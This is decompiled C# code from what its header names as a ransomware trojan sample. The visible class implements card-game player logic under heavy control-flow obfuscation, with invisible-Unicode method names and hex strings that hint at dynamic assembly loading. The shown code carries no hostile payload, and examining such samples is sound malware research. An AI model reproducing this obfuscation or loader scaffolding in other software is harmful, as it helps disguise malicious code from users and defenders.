// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: ASMNA, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 756C4858-C1DF-4594-BBF4-94321F458D9F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b15de477cfbeebb8bbdc45f252c7c6bc6d2897ab737240c78a82a618f6e85508.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -2034487321;
      string str1;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -682689713)) % 10U)
        {
          case 0:
            num1 = (int) num2 * -2113438678 ^ -148446312;
            continue;
          case 1:
            str1 = "417373656D626C794275696C6465724461";
            num1 = (int) num2 * -1983032397 ^ 859891086;
            continue;
          case 2:
            int num3;
            num1 = num3 = BaseStream == 1 ? -2090842976 : (num3 = -7061438);
            continue;
          case 3:
            str2 = str1;
            num1 = -332264173;
            continue;
          case 4:
            goto label_1;
          case 5:
            str1 = "7843304743794A72";
            num1 = (int) num2 * -1094997674 ^ 1181352200;
            continue;
          case 7:
            int num4 = !flag ? -1245094908 : (num4 = -333774857);
            num1 = num4 ^ (int) num2 * 1964099897;
            continue;
          case 8:
            str1 = (string) null;
            flag = BaseStream == 0;
            num1 = (int) num2 * 96732003 ^ 928241480;
            continue;
          case 9:
            num1 = (int) num2 * 1806522489 ^ -1974272139;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -299356940;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -1311138179)) % 5U)
        {
          case 0:
            num1 = (int) num3 * 1414134821 ^ 9620559;
            continue;
          case 1:
            if (this.PlanningCards.Length != 0)
            {
              num4 = this.PlanningCards[cardTypeIndex];
              break;
            }
            num1 = (int) num3 * -136041410 ^ 1400911775;
            continue;
          case 2:
            num4 = 0;
            break;
          case 4:
            goto label_1;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = -1830883070;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = -859856987;
        int index;
        int[] planningCards;
        int num2;
        int planningCardsCount;
        int num3;
        bool flag;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ -1418284253)) % 15U)
          {
            case 0:
              planningCardsCount = num2;
              num1 = (int) num4 * -1329911079 ^ 1889208521;
              continue;
            case 1:
              num1 = (int) num4 * -1696948942 ^ -1342010813;
              continue;
            case 2:
              num2 = 0;
              num1 = (int) num4 * -329122072 ^ -1401833051;
              continue;
            case 3:
              num1 = (int) num4 * 2043261368 ^ 955508140;
              continue;
            case 4:
              num1 = -814578384;
              continue;
            case 5:
              int num5 = !flag ? -1307416648 : (num5 = -2062479113);
              num1 = num5 ^ (int) num4 * 662287891;
              continue;
            case 6:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * 1597254541 ^ 125830555;
              continue;
            case 7:
              flag = num3 > 0;
              num1 = (int) num4 * 1819493471 ^ -421234801;
              continue;
            case 8:
              int num6;
              num1 = num6 = index >= planningCards.Length ? -524663388 : (num6 = -1725623368);
              continue;
            case 9:
              index = 0;
              num1 = (int) num4 * 1823422379 ^ 1699262401;
              continue;
            case 10:
              ++num2;
              num1 = (int) num4 * -1922737766 ^ 1375810222;
              continue;
            case 12:
              ++index;
              num1 = (int) num4 * 226181091 ^ 970196705;
              continue;
            case 13:
              num3 = planningCards[index];
              num1 = -1964085331;
              continue;
            case 14:
              goto label_1;
            default:
              goto label_16;
          }
        }
label_16:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = -1770321026;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -106292205)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * -1191498769 ^ 1749784786;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = 828391110;
      int index;
      int planningCard;
      bool flag;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 293741512)) % 13U)
        {
          case 0:
            str2 = str1;
            num1 = (int) num2 * -904333104 ^ -1158735229;
            continue;
          case 1:
            flag = index < this.PlanningCards.Length;
            num1 = 961444114;
            continue;
          case 2:
            ++index;
            num1 = 364845314;
            continue;
          case 3:
            int num3 = flag ? -323590088 : (num3 = -993039944);
            num1 = num3 ^ (int) num2 * 100609131;
            continue;
          case 5:
            goto label_1;
          case 6:
            str1 = Player.\u200C‌‭‫‌‍⁭‌‍⁫‏‪​⁯‎‭‮⁫​‮‌‬‭‪⁫⁪‏⁯‎⁭‌⁪‮‭‎‫⁮‏‏‬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 2078724476;
            continue;
          case 7:
            index = 0;
            num1 = (int) num2 * -1300789797 ^ 2014742622;
            continue;
          case 8:
            num1 = (int) num2 * -1284637327 ^ -1055528988;
            continue;
          case 9:
            num1 = 1453071733;
            continue;
          case 10:
            str1 = " ";
            num1 = (int) num2 * -1777505035 ^ -966115974;
            continue;
          case 11:
            planningCard = this.PlanningCards[index];
            int num4 = planningCard == 0 ? -1697618577 : (num4 = -2006475211);
            num1 = num4 ^ (int) num2 * 1879512863;
            continue;
          case 12:
            num1 = (int) num2 * 1704299073 ^ -1086378796;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 375697102;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1938620364)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -1489298961 ^ -1080823731;
            continue;
          case 3:
            num1 = (int) num2 * -1430558211 ^ -757442018;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
      int[] numArray = new int[count];
label_1:
      int num1 = 1582597152;
      int aIndex;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2110040501)) % 9U)
        {
          case 1:
            num1 = (int) num2 * -952787207 ^ -1692287650;
            continue;
          case 2:
            ++aIndex;
            num1 = (int) num2 * -862516936 ^ 634058689;
            continue;
          case 3:
            int num3;
            num1 = num3 = aIndex >= count ? 1717585257 : (num3 = 1167238441);
            continue;
          case 4:
            aIndex = 0;
            num1 = (int) num2 * -1798174142 ^ 576502304;
            continue;
          case 5:
            num1 = (int) num2 * 711834547 ^ 1221783644;
            continue;
          case 6:
            goto label_1;
          case 7:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 420021507;
            continue;
          case 8:
            planningCards = numArray;
            num1 = (int) num2 * -1612292422 ^ 223180834;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return planningCards;
    }

    public override string ToString() => Player.\u200B‎‬‎⁭‎⁯⁮‫‏⁭‎⁪‌⁪⁭‎⁭‬⁬​⁫⁫⁮⁬‌‎‮⁭‌‏⁯‏‭⁮‏‎‍‮‍‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);

    static string \u200C‌‭‫‌‍⁭‌‍⁫‏‪​⁯‎‭‮⁫​‮‌‬‭‪⁫⁪‏⁯‎⁭‌⁪‮‭‎‫⁮‏‏‬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200B‎‬‎⁭‎⁯⁮‫‏⁭‎⁪‌⁪⁭‎⁭‬⁬​⁫⁫⁮⁬‌‎‮⁭‌‏⁯‏‭⁮‏‎‍‮‍‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
